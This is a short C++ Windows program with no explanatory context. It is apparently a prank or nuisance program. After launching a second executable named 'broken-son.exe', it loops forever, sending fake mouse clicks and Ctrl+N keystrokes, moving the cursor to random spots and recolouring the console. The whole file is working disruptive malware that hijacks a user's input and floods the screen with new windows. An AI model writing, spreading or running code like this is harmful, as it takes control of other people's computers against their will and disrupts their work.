#include<bits/stdc++.h>
#include<windows.h>
#include<conio.h>
using namespace std;

char col[]="0123456789ABCDEF";

int main(){
	ShowWindow(GetForegroundWindow(),SW_MAXIMIZE);
	srand(time(NULL));
	system("start broken-son.exe");
	while(1){
		mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
		mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
		keybd_event(VK_CONTROL, (BYTE) 0, 0, 0);
		keybd_event('N', (BYTE) 0, 0, 0);
		keybd_event('N', (BYTE)0, KEYEVENTF_KEYUP, 0);
    	keybd_event(VK_CONTROL, (BYTE)0, KEYEVENTF_KEYUP, 0);
		SetCursorPos(rand()%2000,rand()%2000);
		char command[1000];
		sprintf(command,"color %c%c",col[rand()%16],col[rand()%16]);
		system(command);
	}
}
